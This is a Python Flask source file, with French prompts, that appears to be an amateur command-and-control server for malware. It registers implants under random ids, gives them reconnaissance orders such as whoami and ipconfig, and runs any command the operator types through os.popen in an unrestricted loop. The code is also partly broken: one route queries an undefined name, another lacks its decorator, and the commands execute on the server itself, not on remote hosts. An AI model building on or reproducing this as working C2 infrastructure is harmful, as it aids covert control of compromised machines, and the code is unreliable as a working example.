
# -*-coding:Utf-8 -*

from flask import Flask, request
from flask_sqlalchemy import SQLAlchemy
import random
import os
# create the extension
db = SQLAlchemy()
# create the app
app = Flask(__name__)
# configure the SQLite database, relative to the app instance folder
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///project.db"
# initialize the app with the extension
db.init_app(app)

# Constante
#
 
liste_malware = []
dict_order={}
liste_order = ["whoami", "dir", "ipconfig", "time"]
terminal = []

#
# class Ordre():
class Orders(db.Model):
    __tablename__='orders'
    id = db.Column(db.Integer, primary_key=True)
    order = db.Column(db.Integer)


class Users(db.Model):
    __tablename__='users'
    id = db.Column(db.Integer, primary_key=True)
    number = db.Column(db.Integer)
    order_id = db.Column(db.Integer, db.ForeignKey('orders.id'))
    order = db.relationship("Orders", backref="orders", uselist=False)


def lister_resultats():
    print(terminal)
    return terminal

def lister_orders():
    print(liste_order)
    return liste_order

def lister_malwares_actifs():
    #print(liste_malware)
    return liste_malware


def generate_number():
    number_malware = random.randint(0,10)
    if number_malware in liste_malware:
        generate_number()
    else:
        liste_malware.append(number_malware)
        for i in liste_malware:
            dict_order[str(i)] = liste_order
            #print(dict_order)
        return  str(number_malware), dict_order

with app.app_context():
    db.create_all()

@app.route('/debug')
def debug():
    #users = Users.query.all()
    #for user in users:
    #    print(user.number)
    #    print(user.id)
   
    #orders = Orders.query.all()
    #for order in orders:
    #    print (order.order)
    #return str(users)
    debug = db.session.execute(db.select(debug).order_by(debug.id)).scalars()

    return debug



@app.route("/register", methods=["GET"])
def register():
    number_malware = generate_number()
    print(dict_order)
    return str(number_malware)

@app.route("/polling", methods=["GET"])
def polling():
    print("Voici la liste des malwares et leurs ordres", dict_order)
    #input id
    id = input("Quel malware voulez vous contrôler ? ")
    #id = int(id)
    print("id :", id)

    for key, value in dict_order.items():
        if id == key:
            liste_temp = []
            if isinstance(id, dict):
                for sub_key, sub_id in id.items():
                    print(key,sub_key,sub_id)
            else:
                liste_temp = liste_temp + value
                print(key,value)
                #print(liste_temp)

    print("Quelle commande voulez-vous effectuer ?")
    commande = input(liste_temp)
    commande = int(commande)
    if commande == 0:
        result = os.popen(liste_temp[0]).read()
        print("result :", result)
    elif commande == 1:
        result = os.popen(liste_temp[1]).read()
        print("result :", result)
    elif commande == 2:
        result = os.popen(liste_temp[2]).read()
        print("result :", result)
    elif commande == 3:
        result = os.popen(liste_temp[3]).read()
        print("result :", result)
    
    choix_input = input("Voulez-vous faire des commandes à la chaine ?")
    choix_input = int(choix_input)
    if choix_input == 0:
        continuer = True
        while continuer:
            commandes = input("Quelle commande voulez-vous executer ?")
            result = os.popen(commandes).read()
            print("result :", result)
            if commandes == "stop":
                continuer = False
                return result
    
    return result



app.route("/management", methods=["GET"])
def management():
    while True:
        choix = input("Voulez vous lister les malwares actifs ou ne rien faire ou lister les résultats ? ou quitter")
        if choix == "0":
            lister_malwares_actifs()
            
            terminal = polling()
            print("terminal :", terminal)
        elif choix == "1":
            print("nouveaux choix ! ")

        elif choix == "2":
            lister_resultats()
            lister_orders()
        else:
            print("FIN")
            break
    return terminal

app.run()





#def user_create():
#    if request.method == "GET":
#        user = Users(
#
#            order=request.form[int]
#        )
#        db.session.add(user)
#        db.session.commit()
#        return redirect(url_for("user_detail", id=user.id))
#
#    return render_template("user/create.html")
#